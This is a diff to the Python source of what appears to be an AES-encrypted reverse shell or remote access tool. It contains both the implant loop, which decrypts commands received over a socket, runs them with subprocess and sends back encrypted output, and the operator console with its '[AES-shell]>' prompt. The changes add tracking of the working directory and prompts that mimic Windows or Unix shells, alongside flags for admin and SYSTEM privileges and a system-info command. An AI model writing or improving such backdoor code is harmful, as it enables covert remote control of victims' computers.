@@ -440,9 +440,10 @@ while 1:
 		cmd = 'cd %s&&%s&&%s' % (pwd, decrypted, pwdvar)												## This is how we maintain pwd
 		stdout = fsubprocess(cmd)
 		if 'is not recognized as an internal' not in stdout and ': not found' not in stdout:
-			checkpath = ''.join(stdout.split('**n')[-2:]).strip('**n')
-			if ' ' not in checkpath:
-				pwd = checkpath
+			checkpath = stdout.split('**n')[-2].strip('**n').strip('**r')
+			if '[X]' not in checkpath and '[*]' not in checkpath:
+				if checkpath:
+					pwd = checkpath
 
 		result = '**n'.join(stdout.split('**n')[:-1]) + '**nEOFEOFEOFEOFEOFX'
 		encrypted = EncodeAES(cipher, result)
@@ -511,7 +512,16 @@ def fnextcmd():
 	nextcmd = False
 	try:
 		while not nextcmd:
-			nextcmd = raw_input("[AES-shell]>")
+			if pwd:
+				if isWindows:
+					nextcmd = raw_input("%s>" % (pwd))
+				else:
+					if isSystem:
+						nextcmd = raw_input("%s# " % (pwd))
+					else:
+						nextcmd = raw_input("%s$ " % (pwd))
+			else:
+				nextcmd = raw_input("[AES-shell]>")
 	except:
 		print
 		c.close()
@@ -610,12 +620,12 @@ try:
 	readline.set_completer(completer)
 except:
 	pass
-BLOCK_SIZE, PADDING, cfrom = 32, '{', ' '
+BLOCK_SIZE, PADDING, cfrom, pwd = 32, '{', ' ', ''
 pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
 EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
 DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))
 secret, listenport = "***SECRET***", ***PORT***
-isAdmin, is64, isSystem, isProxied = False, False, False, False
+isAdmin, is64, isSystem, isProxied, isWindows, newpwd = False, False, False, False, False, False
 iv = Random.new().read(AES.block_size)
 cipher = AES.new(secret,AES.MODE_CFB, iv)
 c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -634,8 +644,20 @@ while True:
 		decrypted = DecodeAES(cipher, data)
 	except:
 		pass
+
 	if decrypted.endswith("EOFEOFEOFEOFEOFX"):					## Data ending in this code indicates we should print the data
-		print decrypted[:-16]
+		if 'is not recognized as an internal' not in decrypted and ': not found' not in decrypted:
+			checkpath = decrypted.split('**n')[-2].strip('**n').strip('**r')
+			if '[X]' not in checkpath and '[*]' not in checkpath:
+				if ':' in checkpath:
+					isWindows = True
+				pwd = checkpath.strip('**r')
+				newpwd = True
+		if newpwd:
+			print '**n'.join(decrypted.split('**n')[:-2]) + '**n'
+		else:
+			print decrypted[:-16]
+		newpwd = False
 		fnextcmd()
 
 	elif decrypted.endswith('*' * 16):							## Get system info
